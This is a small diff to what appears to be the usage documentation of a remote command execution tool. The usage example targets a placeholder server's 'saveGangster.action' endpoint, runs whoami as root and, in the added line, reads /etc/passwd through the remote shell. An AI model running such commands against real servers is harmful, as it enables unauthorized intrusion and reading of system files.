@@ -15,7 +15,7 @@ set url : http://xx.xx.xx.xx:port/integration/saveGangster.action
 cmd >>: whoami
 root
 
-cmd >>:
+cmd >>: cat /etc/passwd
 ```
 ![](/use-age.jpg)
 
